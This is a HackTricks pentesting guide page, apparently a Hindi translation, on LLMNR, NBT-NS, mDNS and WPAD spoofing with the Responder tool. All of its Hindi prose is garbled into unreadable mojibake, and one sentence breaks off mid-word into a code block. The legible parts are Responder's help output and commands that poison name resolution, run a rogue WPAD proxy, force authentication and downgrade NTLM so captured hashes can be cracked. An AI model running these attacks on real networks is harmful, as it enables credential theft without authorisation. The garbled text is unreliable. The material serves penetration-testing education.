# LLMNR, NBT-NS, mDNS/DNS рдФрд░ WPAD рдХрд╛ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХрд░рдирд╛ рдФрд░ рд░рд┐рд▓реЗ рдЕрдЯреИрдХ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>

## рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

### LLMNR, NBT-NS рдФрд░ mDNS

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╕рд┐рд╕реНрдЯрдо рд▓реЛрдХрд▓ рд╣реЛрд╕реНрдЯ рдХреЗ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ-рд▓реЛрдХрд▓ рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдирд╛рдо рд╕рдВрдХреНрд╖реЗрдкрдг (LLMNR) рдФрд░ рдиреЗрдЯрдмрд╛рдпреЛрд╕ рдирд╛рдо рд╕реЗрд╡рд╛ (NBT-NS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИред рдПрдкрд▓ рдмреЙрдирдЬреЛрд░ рдФрд░ рд▓рд┐рдирдХреНрд╕ рдЬреАрд░реЛ-рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рд┐рд╕реНрдЯрдо рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ DNS (mDNS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ UDP рдкрд░ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рд╕рдВрджреЗрд╢ рднреЗрдЬрддреЗ рд╣реИрдВ; рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЗрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рдкреНрд░реЗрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдлрд╝рд░реНрдЬрд╝реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣рд╛рдВ [Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХреИрд╕реЗ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### WPAD

рдХрдИ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдкреНрд░реЙрдХреНрд╕реА рдСрдЯреЛ-рдбрд┐рд╕реНрдХрд╡рд░реА (WPAD) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред WPAD рд╕рд░реНрд╡рд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ URL (рдЙрджрд╛ред _http://wpad.example.org/wpad.dat_) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрдм рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ:

* DHCP, рдХреЛрдб 252 рдПрдВрдЯреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдореЗрдВ _wpad_ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреА рдЦреЛрдЬ рдХрд░рдирд╛
* рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ LLMNR рдФрд░ NBT-NS (DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ)

Responder WPAD рд╣рдорд▓реЗ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдмрдирд╛рддрд╛ рд╣реИ - рдкреНрд░реЙрдХреНрд╕реА рдЪрд▓рд╛рдирд╛ рдФрд░ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ DHCP, DNS, LLMNR рдФрд░ NBT-NS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА WPAD рд╕рд░реНрд╡рд░ рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ред

## рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ

### Responder - LLMNR, NBT-NS рдФрд░ MDNS

> Responder рдПрдХ LLMNR, NBT-NS рдФрд░ MDNS рдкреЙрдЗрдЬрд╝рдирд░ рд╣реИред рдпрд╣ рдЙрдирдХреЗ рдирд╛рдо рд╕рдВрдХреНрд╖реЗрдк (рджреЗрдЦреЗрдВ: [http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рд╢реЗрд╖ NBT-NS (NetBIOS Name Service) рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрддреНрддрд░ рджреЗрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдпрд╣ рдЙрдкрдХрд░рдг рдХреЗрд╡рд▓ SMB рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рд╕рд░реНрд╡рд░ рд╕реЗрд╡рд╛ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрддреНрддрд░ рджреЗрдЧрд╛ред
>
> рдЗрд╕рдХреЗ рдкреАрдЫреЗ рдХреА рдЕрд╡рдзрд╛рд░рдгрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╣рдорд╛рд░реЗ рдЙрддреНрддрд░реЛрдВ рдХреЛ рд▓рдХреНрд╖реНрдпрд┐рдд рдХрд░реЗрдВ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЫрд┐рдкрдХрд▓реА рдмрдиреЗрдВред рдЗрд╕рд╕реЗ рдпрд╣ рднреА рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рд╣рдо рд╡реИрдз NBT-NS рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдирд╣реАрдВ рддреЛрдбрд╝рддреЗ рд╣реИрдВред

* [**Responder**](https://github.com/lgandx/Responder) рдХрд╛рд▓реА рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ \*\*`/etc/responder/Responder.conf` \*\* рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреА рд╣реИ (рдпрд╣рд╛рдВ рдЖрдк рд░реЛрдЧ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)
* **Responder** рд╕реНрдХреНрд░реАрди рдкрд░ **рд╣реИрд╢ рдЫрд╛рдкреЗрдВрдЧреЗ** рдФрд░ рдЗрд╕реЗ `/usr/share/responder/logs` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╣реЛрд╕реНрдЯ рдкреНрд░рддрд┐ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗрдЧрд╛ред рд╣реИрд╢ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рд░реВрдк рдо
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>рдЙрддреНрддрд░рджрд╛рддрд╛ рдкреИрд░рд╛рдореАрдЯрд░</summary>

* `-A` рдлреНрд▓реИрдЧ рд╣рдореЗрдВ **рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдореЛрдб** рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдо рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ NBT-NS, BROWSER, рдФрд░ LLMNR рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЬрд╡рд╛рдм рдХреЛ рдкреЙрдЗрдЬрд╝рди рдХрд┐рдПред
* рд╣рдореЗрд╢рд╛ рдПрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдпрд╛ рдЖрдИрдкреА рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
* `-wf` WPAD рд░реЛрдЧ рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рдХреЛ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛
* `-f` рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ рдХреЗ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдлрд╝рд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛
* рдЕрдзрд┐рдХ рд╡рд░реНрдмреЛрд╕рд┐рдЯреА рдХреЗ рд▓рд┐рдП `-v` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдХрдВрд╕реЛрд▓ рдкрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдХреА рдмрд╣реБрдд рд╕рд╛рд░реА рдкреНрд░рд┐рдВрдЯ рд╣реЛрдЧреА)
* `-F` рдФрд░ `-P` рдЬреИрд╕реЗ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTLM рдпрд╛ рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмрд▓рд╡рд╛рди рдмрдирд╛рдиреЗ рдФрд░ рдкреНрд░реЙрдХреНрд╕реА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмрд▓рд╡рд╛рди рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд▓реЙрдЧрд┐рди рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрдирдХрд╛ рд╕рд╛рд╡рдзрд╛рдиреАрдкреВрд░реНрд╡рдХ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
* `-w` рдлреНрд▓реИрдЧ рдирд┐рд░реНрдорд┐рдд WPAD рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдмрд╣реБрдд рдкреНрд░рднрд╛рд╡реА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрдбрд╝реЗ рд╕рдВрдЧрдардиреЛрдВ рдореЗрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рднреА HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛ рдЬреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЙрдиреНрдЪ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЕрдЧрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ [рд╕реНрд╡рдЪрд╛рд▓рд┐рдд-рдкрддрд╛-рдкрддрд╛-рд▓рдЧрд╛рдПрдВ](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) рд╕рдХреНрд╖рдо рд╣реИред

</details>

#### рд░рдирд┐рдВрдЧ рдЙрддреНрддрд░рджрд╛рддрд╛

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрддреНрддрд░рджрд╛рддрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
рдПрдХ рд░реЛрдЪрдХ рддрдХрдиреАрдХ рд╣реИ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдирдЯреАрдПрд▓рдПрдо рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдиреАрдЪреЗ рдЧреНрд░реЗрдб рдХрд░рдирд╛ рдЬрдм рд╕рдВрднрд╡ рд╣реЛред рдЗрд╕рд╕реЗ **рдПрдирдЯреАрдПрд▓рдПрдорд╡реА1 рдЪреБрдиреМрддрд┐рдпреЛрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рдХреИрдкреНрдЪрд░** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреА рдмрдЬрд╛рдп рдПрдирдЯреАрдПрд▓рдПрдорд╡реА2 рдХреА рдЬреЛ **рдЖрд╕рд╛рдиреА рд╕реЗ рдХреНрд░реИрдХ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ** [**рдЗрд╕ рдЧрд╛рдЗрдб рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ**](../../windows-hardening/ntlm/#ntlmv1-attack)**ред**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
**рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, **рдбрдмреНрд▓реНрдпреВрдкреАрдПрдбреА рдЕрдиреБрдХрд░рдг рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛**, рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕реЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
responder -I <Iface> --wpad
```
рдЖрдк рдЕрдкрдиреЗ рдЖрдИрдкреА рдХреЗ рд╕рд╛рде рдиреЗрдЯрдмрд╛рдпреЛрд╕ рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рднреА **рд╕реБрд▓рдЭрд╛ рд╕рдХрддреЗ** рд╣реИрдВред рдФрд░ рдПрдХ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЙрдХреНрд╕реА** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
responder.py -I <interface> -Pv
```
рдЖрдк рдЖрдорддреМрд░ рдкрд░ NTLM рд╣реИрд╢ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдХреБрдЫ **NTLM рдЪреБрдиреМрддрд┐рдпреЛрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ** рдкрдХрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**john**_ рд╡рд┐рдХрд▓реНрдк `--format=netntlmv2` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд░реИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдХрд╛рд▓реА рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ _**Responder**_ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ **рд▓реЙрдЧ рдФрд░ рдЪреБрдиреМрддрд┐рдпрд╛рдБ** `/usr/share/responder/logs` рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреА рд╣реИрдВред

#### Responder - DHCP Poisoning

Windows рдХрдИ рдХрд╕реНрдЯрдо DHCP рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ NetBIOS, WINS, WPAD рд╕реЗрдЯрд┐рдВрдЧреНрд╕ред рдЬрдм рдХрд┐рд╕реА рдХрд╛рд░реНрдпрд╕реНрдерд▓реА рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ DHCP рдЕрдиреБрд░реЛрдз рднреЗрдЬрддреА рд╣реИ, рддреЛ рдЗрди рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ DHCP рдЙрддреНрддрд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реАрдзреА рд╕рдВрдкрд░реНрдХрддрд╛ рдФрд░ рдирд╛рдо рд╕рдВрдХреЗрддрд╛рдВрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реЛ рд╕рдХреЗред

рдбрд┐рд╕реНрд░рдкреНрд╢рди рдХреЗ рдмрд┐рдирд╛ DHCP рдЙрддреНрддрд░ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдирд╛ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдХрд╛рд░реНрдпрд╕реНрдерд▓реА рдиреЗрдЯрд╡рд░реНрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЖрдорддреМрд░ рдкрд░, рдЖрдкрдХреЛ рд▓рдХреНрд╖реНрдп рд╕рдмрдиреЗрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╣реБрдд рдЕрдЪреНрдЫреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, DNS рд╕рд░реНрд╡рд░ рдХрд╣рд╛рдВ рд╣реИ, рд╕реНрд╡рд┐рдЪ рдХрд╣рд╛рдВ рд╣реИ, рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓, рдбреЛрдореЗрди, рдиреЗрдЯрдорд╛рд╕реНрдХ, DHCP рд╕рд░реНрд╡рд░, рдЖрджрд┐ред **рдЗрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдХреЛрдИ рднреА рдЧрд▓рддреА рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд╡рд┐рдШрдЯрди рдХрд╛ рдХрд╛рд░рдг рдмрдиреЗрдЧреАред**

рд╣рд╛рд▓рд╛рдВрдХрд┐, DHCP рдЙрддреНрддрд░реЛрдВ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рдЕрджреНрд╡рд┐рддреАрдп рд▓рд╛рдн рд╣реЛрддреЗ рд╣реИрдВред **рдпрд╣ ARP рдЕрд╡рд░реЛрдзрди** рд╕реЗ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЫрд┐рдкрдХрд░ рд╣реЛрддрд╛ рд╣реИ; рдПрдХ рдпреВрдирд┐рдХрд╛рд╕реНрдЯ рдЙрддреНрддрд░ рдПрдХ рдкреАрдбрд╝рд┐рдд рдХреЗ рд░реВрдЯрд┐рдВрдЧ рд╕реВрдЪрдирд╛ рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдПрдХрд╛рдзрд┐рдХ DHCP рд╕рд░реНрд╡рд░реЛрдВ рдХрд╛ рд╕рдВрдЪрд╛рд▓рди рджреЗрдЦрдирд╛ рднреА рд╕рд╛рдорд╛рдиреНрдп рд╣реИред рдпреВрдирд┐рдХрд╛рд╕реНрдЯ DHCP рдЙрддреНрддрд░реЛрдВ рдХреЛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдХрдард┐рди рд╣реЛрддрд╛ рд╣реИ, рдХреБрдЫ рд╕реНрд╡рд┐рдЪ DHCP рд╕реНрдиреВрдкрд┐рдВрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЬрдм рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВ рддреЛ рд╡реЗ рд╕реАрдзреЗ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЕрдХреНрд╕рд░ рдЧрд▓рдд рд░реВрдк 